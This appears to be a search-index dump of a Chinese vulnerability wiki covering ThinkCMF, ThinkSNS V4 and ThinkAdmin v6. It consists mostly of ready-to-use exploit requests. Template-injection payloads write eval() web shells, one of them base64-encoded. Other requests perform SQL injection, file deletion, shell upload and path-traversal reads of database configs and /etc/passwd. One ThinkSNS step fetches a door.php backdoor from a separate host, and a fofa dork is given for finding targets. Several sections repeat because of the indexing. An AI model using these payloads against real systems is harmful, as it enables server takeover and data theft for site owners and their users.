thinkcmf \u5e76\u6ca1\u6709\u6b7b\uff0c\u5e76\u4e14\u67093\u7248\u672c\u4e0e5\u7248\u672c\u8fd9\u91cc\u63d0\u4f9b\u4e00\u4e9b\u65b9\u6cd5\uff0c\u5e2e\u52a9\u4f60\u4eec\u8fa8\u522b\u54ea\u4e00\u4e9b\u662f\u53ef\u4ee5\u65e5\u7684\uff0c\u90a3\u4e00\u4e9b\u4e8b\u4e0d\u884c\u7684\u3002 1.\u770blogo 3\u7684logo\u662f\u9ec4\u8272\u7684. 2.\u5728\u7f51\u7ad9url \u540e\u9762\u8f93\u5165 admin,\u5982\u679c\u9875\u9762\u662f\u84dd\u8272\u7684\u8868\u793a\u662f3\u7684\uff0c\u53ef\u65e5\u7a7f\u4e4b. 3.\u67e5\u770b README.md \u5728\u7f51\u7ad9url\u540e\u9762\u8f93\u5165README.md. \u53e6\u5916\u8fd8\u6709\u4e00\u4e2a\u8bf4\u660e\uff0c\u4f60\u5728\u5b9e\u9645\u64cd\u4f5c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u80fd\u4f1a\u9047\u5230\u4ed6\u4e00\u76f4\u62a5\u8fd9\u4e2a \u6a21\u677f\u4e0d\u5b58\u5728 \u9519: url:http://thinkcmf.test/index.php?g=Comment&m=Widget&a=fetch post: templateFile=/../public/index prefix='' content=<php>file_put_contents('test.php','<?php eval($_REQUEST[11]);')</php> \u8bf7\u653e\u5fc3\u8fd9\u5e76\u4e0d\u662f\u8bf4\u660e\u6f0f\u6d1e\u4e0d\u53ef\u4f7f\u7528\uff0c\u800c\u662f\u8bf4\uff0c\u8fd9\u4e2a\u6a21\u7248\u4e0d\u5b58\u5728\uff0c\u4f60\u53ef\u4ee5\u6362\u4e00\u4e2ahtml\u5373\u53ef \u4f8b\u5982\uff1a /../public/index /../public/exception /../data/index /../data/runtime/index /../plugins/Mobileverify/View/admin_index /../plugins/Mobileverify/View/index /../plugins/Mobileverify/View/widget /../plugins/Demo/View/admin_index /../plugins/Demo/View/index /../plugins/Demo/View/widget /../application/Install/View/Public/footer /../application/Install/View/Public/head /../application/Install/View/Public/header /../application/Common/index /../application/Portal/Lang/en-us/index /../application/Api/Lang/en-us/index /../application/Api/Lang/zh-cn/index /../application/Comment/Lang/en-us/index /../application/Comment/Lang/zh-cn/index url:http://thinkcmf.test/index.php?g=Api&m=Plugin&a=fetch post: templateFile=/../../../public/index prefix='' content=<php>file_put_contents('test1.php','<?php eval($_REQUEST[11]);')</php> /../../../public/index /../../../public/exception /../../../data/index /../../../data/runtime/index /../../../plugins/Mobileverify/View/admin_index /../../../plugins/Mobileverify/View/index /../../../plugins/Mobileverify/View/widget /../../../plugins/Demo/View/admin_index /../../../plugins/Demo/View/index /../../../plugins/Demo/View/widget /../../../application/Install/View/Public/footer /../../../application/Install/View/Public/head /../../../application/Install/View/Public/header /../../../application/Common/index /../../../application/Portal/Lang/en-us/index /../../../application/Api/Lang/en-us/index /../../../application/Api/Lang/zh-cn/index /../../../application/Comment/Lang/en-us/index /../../../application/Comment/Lang/zh-cn/index \u8fd8\u6709\u6700\u540e\u4e00\u53e5\u5e9f\u8bdd\uff1a\u6a21\u7248\u6ce8\u5165\u5bf9\u4e8elinux \u5e76\u4e0d\u597d\u7528 : ) \u53c2\u8003\uff1a https://xz.aliyun.com/t/3409 https://xz.aliyun.com/t/3529 https://mochazz.github.io/2019/07/25/ThinkCMFX%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0","title":"ThinkCMF\u6f0f\u6d1e\u5168\u96c6\u548c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/ThinkCMF%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9B%86%E5%92%8C/#thinkcmf","text":"...\u6301\u7eed\u6536\u96c6,\u6b22\u8fce\u8d21\u732e \u524d\u53f0SQL\u6ce8\u5165: \u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\uff0c\u9ed8\u8ba4\u53ef\u6ce8\u518c paylaod: POST /ThinkCMFX/index.php?g=portal&m=article&a=edit_post HTTP/1.1 Host: localhost Connection: close Cookie: PHPSESSID=kcg5v82ms3v13o8pgrhh9saj95 Content-Type: application/x-www-form-urlencoded Content-Length: 79 post[id][0]=bind&post[id][1]=0 and updatexml(1, concat(0x7e,user(),0x7e),1)--+- \u8fd8\u6709\u4ee5\u4e0b\u53ef\u4ee5\u6d4b\u8bd5\uff1a post: term:123 post[post_title]:123 post[post_title]:aaa post_title:123 post[id][0]:bind \u524d\u53f0\u6a21\u7248\u6ce8\u5165\u6f0f\u6d1e-\u53efgetshell\u56db\u5904 ```raw","title":"ThinkCMF\u6f0f\u6d1e\u5168\u96c6\u548c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/ThinkCMF%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9B%86%E5%92%8C/#windows","text":"","title":"\u4ec5\u5728Windows\u73af\u5883\u6d4b\u8bd5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/ThinkCMF%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9B%86%E5%92%8C/#_1","text":"http://website/ThinkCMFX/index.php?g=Comment&m=Widget&a=fetch&templateFile=/../public/index&content= <%3fphp+file_put_contents('m.php','<%3fphp+eval($ POST[ ])%3b');?>&prefix=","title":"\u7b2c\u4e00\u5904"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/ThinkCMF%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9B%86%E5%92%8C/#_2","text":"http://website/ThinkCMFX/index.php?g=Api&m=Plugin&a=fetch&templateFile=/../../../public/index&content= <%3fphp+file_put_contents('m.php','<%3fphp+eval($ POST[ ])%3b');?>&prefix=","title":"\u7b2c\u4e8c\u5904"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/ThinkCMF%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9B%86%E5%92%8C/#_3","text":"/index.php?a=fetch&templateFile=public/index&prefix=''&content= file_put_contents('test.php','<?php phpinfo(); ?>')","title":"\u7b2c\u4e09\u5904"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/ThinkCMF%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9B%86%E5%92%8C/#_4","text":"/index.php?a=fetch&content=<?php+file_put_contents(\"mrxn.php\", base64_decode(\"PD9waHAgZXZhbCgkX1BPU1RbIjAwMCJdKTs/Pg==\")); ``` \u4efb\u610f\u6587\u4ef6\u5220\u9664-\u53ea\u80fdwindows\u5220\u9664 \u5728\u7528\u6237\u4e0a\u4f20\u5934\u50cf\u5904\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\uff0c\u53d1\u9001\u5982\u4e0b\u6570\u636e\u5305\u540e\uff0c\u4f1a\u5220\u9664\u7f51\u7ad9\u6839\u76ee\u5f55\u4e0b\u4e00\u4e2a\u540d\u4e3a test.txt \u7684\u6587\u4ef6\u3002\uff08\u8be5\u6f0f\u6d1e\u4ec5\u80fd\u5728 Windows \u4e0b\u89e6\u53d1\uff09 POST /ThinkCMFX/index.php?g=User&m=Profile&a=do_avatar& HTTP/1.1 Host: localhost Cookie: PHPSESSID=bggit7phrb1dl99pcb2lagbmq0; Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 27 imgurl=..\\..\\..\\test.txt \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u5728 ThinkCMFX2.2.3 \u6700\u7ec8\u7248\u4e2d\uff0c\u5b58\u5728\u4e00\u5904\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff08\u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\uff0c\u9ed8\u8ba4\u53ef\u6ce8\u518c\uff09 curl -F \"file=@/tmp/shell.php\" -X \"POST\" -b 'PHPSESSID=qekmttucmue6vv41kpdjghnkd0;' 'http://127.0.0.1/ThinkCMFX/index.php?g=Asset&m=Ueditor&a=upload&action=uploadfile' \u4efb\u610f\u6587\u4ef6\u5305\u542b\uff08\u8bfb\u53d6\u6570\u636e\u5e93\u914d\u7f6e\u7b49\u7b49\uff09 /index.php?a=display&templateFile=README.md","title":"\u7b2c\u56db\u5904"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/ThinkCMF%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9B%86%E5%92%8C/#_5","text":"thinkcmf \u5e76\u6ca1\u6709\u6b7b\uff0c\u5e76\u4e14\u67093\u7248\u672c\u4e0e5\u7248\u672c\u8fd9\u91cc\u63d0\u4f9b\u4e00\u4e9b\u65b9\u6cd5\uff0c\u5e2e\u52a9\u4f60\u4eec\u8fa8\u522b\u54ea\u4e00\u4e9b\u662f\u53ef\u4ee5\u65e5\u7684\uff0c\u90a3\u4e00\u4e9b\u4e8b\u4e0d\u884c\u7684\u3002 1.\u770blogo 3\u7684logo\u662f\u9ec4\u8272\u7684. 2.\u5728\u7f51\u7ad9url \u540e\u9762\u8f93\u5165 admin,\u5982\u679c\u9875\u9762\u662f\u84dd\u8272\u7684\u8868\u793a\u662f3\u7684\uff0c\u53ef\u65e5\u7a7f\u4e4b. 3.\u67e5\u770b README.md \u5728\u7f51\u7ad9url\u540e\u9762\u8f93\u5165README.md. \u53e6\u5916\u8fd8\u6709\u4e00\u4e2a\u8bf4\u660e\uff0c\u4f60\u5728\u5b9e\u9645\u64cd\u4f5c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u80fd\u4f1a\u9047\u5230\u4ed6\u4e00\u76f4\u62a5\u8fd9\u4e2a \u6a21\u677f\u4e0d\u5b58\u5728 \u9519: url:http://thinkcmf.test/index.php?g=Comment&m=Widget&a=fetch post: templateFile=/../public/index prefix='' content=<php>file_put_contents('test.php','<?php eval($_REQUEST[11]);')</php> \u8bf7\u653e\u5fc3\u8fd9\u5e76\u4e0d\u662f\u8bf4\u660e\u6f0f\u6d1e\u4e0d\u53ef\u4f7f\u7528\uff0c\u800c\u662f\u8bf4\uff0c\u8fd9\u4e2a\u6a21\u7248\u4e0d\u5b58\u5728\uff0c\u4f60\u53ef\u4ee5\u6362\u4e00\u4e2ahtml\u5373\u53ef \u4f8b\u5982\uff1a /../public/index /../public/exception /../data/index /../data/runtime/index /../plugins/Mobileverify/View/admin_index /../plugins/Mobileverify/View/index /../plugins/Mobileverify/View/widget /../plugins/Demo/View/admin_index /../plugins/Demo/View/index /../plugins/Demo/View/widget /../application/Install/View/Public/footer /../application/Install/View/Public/head /../application/Install/View/Public/header /../application/Common/index /../application/Portal/Lang/en-us/index /../application/Api/Lang/en-us/index /../application/Api/Lang/zh-cn/index /../application/Comment/Lang/en-us/index /../application/Comment/Lang/zh-cn/index url:http://thinkcmf.test/index.php?g=Api&m=Plugin&a=fetch post: templateFile=/../../../public/index prefix='' content=<php>file_put_contents('test1.php','<?php eval($_REQUEST[11]);')</php> /../../../public/index /../../../public/exception /../../../data/index /../../../data/runtime/index /../../../plugins/Mobileverify/View/admin_index /../../../plugins/Mobileverify/View/index /../../../plugins/Mobileverify/View/widget /../../../plugins/Demo/View/admin_index /../../../plugins/Demo/View/index /../../../plugins/Demo/View/widget /../../../application/Install/View/Public/footer /../../../application/Install/View/Public/head /../../../application/Install/View/Public/header /../../../application/Common/index /../../../application/Portal/Lang/en-us/index /../../../application/Api/Lang/en-us/index /../../../application/Api/Lang/zh-cn/index /../../../application/Comment/Lang/en-us/index /../../../application/Comment/Lang/zh-cn/index \u8fd8\u6709\u6700\u540e\u4e00\u53e5\u5e9f\u8bdd\uff1a\u6a21\u7248\u6ce8\u5165\u5bf9\u4e8elinux \u5e76\u4e0d\u597d\u7528 : ) \u53c2\u8003\uff1a https://xz.aliyun.com/t/3409 https://xz.aliyun.com/t/3529 https://mochazz.github.io/2019/07/25/ThinkCMFX%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0","title":"\u4f7f\u7528\u8bf4\u660e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ThinkSNS/ThinkSNS_V4/","text":"ThinkSNS_V4 \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u5bfc\u81f4Getshell \u00b6 Affected Version \u00b6 ThinkSNS\u5b98\u7f51\uff1ahttp://www.thinksns.com \u7f51\u7ad9\u6e90\u7801\u7248\u672c\uff1aThinkSNS V4 \u66f4\u65b0\u65f6\u95f4\uff1a2017-09-13 \u7a0b\u5e8f\u6e90\u7801\u4e0b\u8f7d\uff1ahttp://www.thinksns.com/experience.html\uff08\u586b\u5199\u4fe1\u606f\u540e\uff0c\u63d0\u4ea4\u5e76\u4e0b\u8f7d\u4ee3\u7801\uff09 \u9ed8\u8ba4\u540e\u53f0\u5730\u5740\uff1ahttp://127.0.0.1/index.php?app=admin&mod=Public&act=login \u9ed8\u8ba4\u7528\u6237\u5bc6\u7801\uff1a\u7ba1\u7406\u5458\u5e10\u53f7: admin@admin.com \u5bc6\u7801\u81ea\u8bbe\uff0c\u5927\u4e8e6\u4f4d Code analysis \u00b6 \u5b58\u5728\u6f0f\u6d1e\u4ee3\u7801 \\ts4\\apps\\admin\\Lib\\Action\\UpgradeAction.class.php \u4e2d\u7684\u4e00\u4e2a\u51fd\u6570\u4e2d\u3002 public function step1() { $downUrl = $_GET['upurl']; $downUrl = urldecode($downUrl); $path = DATA_PATH.'/'.'upgrade/'.basename($downUrl); // # \u5907\u4efd\u8001\u914d\u7f6e\u6587\u4ef6 $oldConf = file_get_contents(CONF_PATH.'/thinksns.conf.php'); file_put_contents(DATA_PATH.'/old.thinksns.conf.php', $oldConf); // # \u4e0b\u8f7d\u589e\u91cf\u5305 is_dir(dirname($path)) or mkdir(dirname($path), 0777, true); file_put_contents($path, file_get_contents($downUrl)); file_exists($path) or $this->showError('\u4e0b\u8f7d\u5347\u7ea7\u5305\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5'.dirname($path).'\u76ee\u5f55\u662f\u5426\u53ef\u5199\uff0c\u5982\u679c\u53ef\u5199\uff0c\u8bf7\u5237\u65b0\u91cd\u8bd5\uff01'); // \u9a8c\u8bc1hash\u5224\u65ad\u5305\u662f\u5426\u5408\u6cd5\u3002 $filename = dirname($path).'/upgrade.json'; $data = file_get_contents($filename); $data = json_decode($data, false); if (md5_file($path) != $data->md5) { $this->showError('\u66f4\u65b0\u5305\u6821\u9a8c\u5931\u8d25\uff0c\u8bf7\u91cd\u65b0\u6267\u884c\u5347\u7ea7.'); } \u51fd\u6570 file_put_contents \u2014 \u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u5199\u5165\u6587\u4ef6 file_get_contents \u2014 \u5c06\u6574\u4e2a\u6587\u4ef6\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32 \u5728\u8fd9\u6bb5\u51fd\u6570\u4e2d\uff0c\u5148\u5907\u4efd\u8001\u914d\u7f6e\u6587\u4ef6\uff0c\u7136\u540e\u4e0b\u8f7d\u589e\u91cf\u5305\uff0c\u4e0b\u8f7d\u53c2\u6570$downUrl\u672a\u7ecf\u8fc7\u4efb\u4f55\u5904\u7406\uff0c\u76f4\u63a5\u4e0b\u8f7d\u5230\u7f51\u7ad9\u76ee\u5f55\u4e0b\uff0c\u63a5\u7740\u9a8c\u8bc1hash\u5224\u65ad\u5305\u662f\u5426\u5408\u6cd5\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u5220\u9664\u4e0b\u8f7d\u7684\u589e\u91cf\u5305\uff0c \u5bfc\u81f4\u7a0b\u5e8f\u5728\u5b9e\u73b0\u4e0a\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e\uff0c\u4e0b\u8f7d\u8fdc\u7a0b\u6587\u4ef6\u5230\u7f51\u7ad9\u76ee\u5f55\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u6307\u5b9a\u7b2c\u4e09\u65b9url\u4e0b\u8f7d\u6076\u610f\u811a\u672c\u5230\u7f51\u7ad9\u76ee\u5f55\uff0c\u8fdb\u4e00\u6b65\u89e6\u53d1\u6076\u610f\u4ee3\u7801\uff0c\u63a7\u5236\u7f51\u7ad9\u670d\u52a1\u5668\u3002 \u8fdc\u7a0b\u4e0b\u8f7d\u6587\u4ef6\uff0c\u5728\u53e6\u4e00\u4e2a\u670d\u52a1\u5668\u4e0a\u521b\u5efadoor.php\u3002 <?php echo \"<?php\"; echo \"eval(file_get_contents('php://input'));\"; echo \"?>\"; ?> \u8fdc\u7a0b\u4e0b\u8f7d http://127.0.0.1:8000/ts4/index.php?app=admin&mod=Upgrade&act=step1&upurl=http://192.168.86.194:8000/door.php \u4f1a\u5728 ts4\\data\\upgrade \u51fa\u73b0\u4e0b\u8f7d\u7684 door.php \u6587\u4ef6\u3002 References \u00b6 ThinkSNS_V4 \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u5bfc\u81f4Getshell","title":"ThinkSNS_V4 \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u5bfc\u81f4Getshell"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ThinkSNS/ThinkSNS_V4/#thinksns_v4-getshell","text":"","title":"ThinkSNS_V4 \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u5bfc\u81f4Getshell"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ThinkSNS/ThinkSNS_V4/#affected-version","text":"ThinkSNS\u5b98\u7f51\uff1ahttp://www.thinksns.com \u7f51\u7ad9\u6e90\u7801\u7248\u672c\uff1aThinkSNS V4 \u66f4\u65b0\u65f6\u95f4\uff1a2017-09-13 \u7a0b\u5e8f\u6e90\u7801\u4e0b\u8f7d\uff1ahttp://www.thinksns.com/experience.html\uff08\u586b\u5199\u4fe1\u606f\u540e\uff0c\u63d0\u4ea4\u5e76\u4e0b\u8f7d\u4ee3\u7801\uff09 \u9ed8\u8ba4\u540e\u53f0\u5730\u5740\uff1ahttp://127.0.0.1/index.php?app=admin&mod=Public&act=login \u9ed8\u8ba4\u7528\u6237\u5bc6\u7801\uff1a\u7ba1\u7406\u5458\u5e10\u53f7: admin@admin.com \u5bc6\u7801\u81ea\u8bbe\uff0c\u5927\u4e8e6\u4f4d","title":"Affected Version"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ThinkSNS/ThinkSNS_V4/#code-analysis","text":"\u5b58\u5728\u6f0f\u6d1e\u4ee3\u7801 \\ts4\\apps\\admin\\Lib\\Action\\UpgradeAction.class.php \u4e2d\u7684\u4e00\u4e2a\u51fd\u6570\u4e2d\u3002 public function step1() { $downUrl = $_GET['upurl']; $downUrl = urldecode($downUrl); $path = DATA_PATH.'/'.'upgrade/'.basename($downUrl); // # \u5907\u4efd\u8001\u914d\u7f6e\u6587\u4ef6 $oldConf = file_get_contents(CONF_PATH.'/thinksns.conf.php'); file_put_contents(DATA_PATH.'/old.thinksns.conf.php', $oldConf); // # \u4e0b\u8f7d\u589e\u91cf\u5305 is_dir(dirname($path)) or mkdir(dirname($path), 0777, true); file_put_contents($path, file_get_contents($downUrl)); file_exists($path) or $this->showError('\u4e0b\u8f7d\u5347\u7ea7\u5305\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5'.dirname($path).'\u76ee\u5f55\u662f\u5426\u53ef\u5199\uff0c\u5982\u679c\u53ef\u5199\uff0c\u8bf7\u5237\u65b0\u91cd\u8bd5\uff01'); // \u9a8c\u8bc1hash\u5224\u65ad\u5305\u662f\u5426\u5408\u6cd5\u3002 $filename = dirname($path).'/upgrade.json'; $data = file_get_contents($filename); $data = json_decode($data, false); if (md5_file($path) != $data->md5) { $this->showError('\u66f4\u65b0\u5305\u6821\u9a8c\u5931\u8d25\uff0c\u8bf7\u91cd\u65b0\u6267\u884c\u5347\u7ea7.'); } \u51fd\u6570 file_put_contents \u2014 \u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u5199\u5165\u6587\u4ef6 file_get_contents \u2014 \u5c06\u6574\u4e2a\u6587\u4ef6\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32 \u5728\u8fd9\u6bb5\u51fd\u6570\u4e2d\uff0c\u5148\u5907\u4efd\u8001\u914d\u7f6e\u6587\u4ef6\uff0c\u7136\u540e\u4e0b\u8f7d\u589e\u91cf\u5305\uff0c\u4e0b\u8f7d\u53c2\u6570$downUrl\u672a\u7ecf\u8fc7\u4efb\u4f55\u5904\u7406\uff0c\u76f4\u63a5\u4e0b\u8f7d\u5230\u7f51\u7ad9\u76ee\u5f55\u4e0b\uff0c\u63a5\u7740\u9a8c\u8bc1hash\u5224\u65ad\u5305\u662f\u5426\u5408\u6cd5\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u5220\u9664\u4e0b\u8f7d\u7684\u589e\u91cf\u5305\uff0c \u5bfc\u81f4\u7a0b\u5e8f\u5728\u5b9e\u73b0\u4e0a\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e\uff0c\u4e0b\u8f7d\u8fdc\u7a0b\u6587\u4ef6\u5230\u7f51\u7ad9\u76ee\u5f55\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u6307\u5b9a\u7b2c\u4e09\u65b9url\u4e0b\u8f7d\u6076\u610f\u811a\u672c\u5230\u7f51\u7ad9\u76ee\u5f55\uff0c\u8fdb\u4e00\u6b65\u89e6\u53d1\u6076\u610f\u4ee3\u7801\uff0c\u63a7\u5236\u7f51\u7ad9\u670d\u52a1\u5668\u3002 \u8fdc\u7a0b\u4e0b\u8f7d\u6587\u4ef6\uff0c\u5728\u53e6\u4e00\u4e2a\u670d\u52a1\u5668\u4e0a\u521b\u5efadoor.php\u3002 <?php echo \"<?php\"; echo \"eval(file_get_contents('php://input'));\"; echo \"?>\"; ?> \u8fdc\u7a0b\u4e0b\u8f7d http://127.0.0.1:8000/ts4/index.php?app=admin&mod=Upgrade&act=step1&upurl=http://192.168.86.194:8000/door.php \u4f1a\u5728 ts4\\data\\upgrade \u51fa\u73b0\u4e0b\u8f7d\u7684 door.php \u6587\u4ef6\u3002","title":"Code analysis"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ThinkSNS/ThinkSNS_V4/#references","text":"ThinkSNS_V4 \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u5bfc\u81f4Getshell","title":"References"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkadmin/ThinkAdmin%20v6%20%E5%88%97%E7%9B%AE%E5%BD%95%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","text":"ThinkAdmin v6 \u5217\u76ee\u5f55\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 V5\u524d\uff0c\u76f4\u63a5\u4e5f\u80fd\u8bfb\u53d6 \u5217\u76ee\u5f55 poc: version()\u53ef\u4ee5\u83b7\u53d6\u5230\u5f53\u524d\u7248\u672c\uff1a2020.08.03.01\uff0c\u2264\u8fd9\u4e2a\u7248\u672c\u7684\u90fd\u6709\u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/version \u8bfb\u53d6\u7f51\u7ad9\u6839\u76ee\u5f55Payload: http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/node post:rules=[\"/\"] \u4e5f\u53ef\u4ee5\u4f7f\u7528../\u6765\u8fdb\u884c\u76ee\u5f55\u7a7f\u8d8a-\u300b rules=[\"../../../\"] \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 \u9700\u8981\u8fdb\u884cencode() \u52a0\u5bc6\u4e00\u4e0b\u5b57\u7b26\u4e32 On Windows read database.php payload: database.php => public/static/../../config/database\"php /admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34 On Linux read /etc/passwd payload: /admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s","title":"ThinkAdmin v6 \u5217\u76ee\u5f55\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkadmin/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/","text":"\u6f0f\u6d1e\u4fe1\u606f: \u00b6 ThinkAdmin\u662f\u4e00\u5957\u57fa\u4e8eThinkPHP\u6846\u67b6\u7684\u901a\u7528\u540e\u53f0\u7ba1\u7406\u7cfb\u7edf\u3002ThinkAdmin 6\u7248\u672c\u5b58\u5728\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u901a\u8fc7GET\u8bf7\u6c42\u7f16\u7801\u53c2\u6570\u4efb\u610f\u8bfb\u53d6\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\u3002 \u5f71\u54cd\u8303\u56f4: \u00b6 Thinkadmin\u7248\u672c\u5c0f\u4e8e \u2264 2020.08.03.01 \u6f0f\u6d1e\u590d\u73b0: \u00b6 fofa_dork: \u201cThinkAdmin\u201d && title\u201d\u7cfb\u7edf\u767b\u5f55 \u00b7 ThinkAdmin\u201d POC: \u00b6 ``` POST /admin.html?s=admin/api.Update/node HTTP/1.1 Host: xxxxxx Accept: / Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 22 rules=%5B%22.%2F%22%5D ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/\u5fae\u4fe1\u56fe\u7247_20200921085600.jpg) \u83b7\u53d6\u7248\u672c\u4fe1\u606f: https://xxxxx/admin.html?s=admin/api.Update/version ```2\u3001\u2f42\u4ef6\u8bfb\u53d6,\u540e\u2faf\u90a3\u2f00\u4e32\u662fUTF8\u5b57\u7b26\u4e32\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002\u8ba1\u7b97\u2f45\u5f0f\u5728Update.php\u4e2d\u7684\u52a0\u5bc6\u51fd\u6570\u3002 /admin.html? s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34 \u4fee\u590d\u65b9\u6848: \u00b6 \u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4fee\u590d\u76f8\u5173\u95ee\u9898\uff0c\u8bf7\u53d7\u5f71\u54cd\u7528\u6237\u5c3d\u5feb\u5347\u7ea7\u5230\u5b89\u5168\u7248\u672c","title":"Thinkadmin v6\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff08CVE-2020-25540\uff09"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkadmin/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/#_1","text":"ThinkAdmin\u662f\u4e00\u5957\u57fa\u4e8eThinkPHP\u6846\u67b6\u7684\u901a\u7528\u540e\u53f0\u7ba1\u7406\u7cfb\u7edf\u3002ThinkAdmin 6\u7248\u672c\u5b58\u5728\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u901a\u8fc7GET\u8bf7\u6c42\u7f16\u7801\u53c2\u6570\u4efb\u610f\u8bfb\u53d6\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\u3002","title":"\u6f0f\u6d1e\u4fe1\u606f:"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkadmin/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/#_2","text":"Thinkadmin\u7248\u672c\u5c0f\u4e8e \u2264 2020.08.03.01","title":"\u5f71\u54cd\u8303\u56f4:"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkadmin/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/#_3","text":"fofa_dork: \u201cThinkAdmin\u201d && title\u201d\u7cfb\u7edf\u767b\u5f55 \u00b7 ThinkAdmin\u201d","title":"\u6f0f\u6d1e\u590d\u73b0:"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Thinkadmin/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/#poc","text":"``` POST /admin.html?s=admin/api.Update/node HTTP/1.1 Host: xxxxxx Accept: / 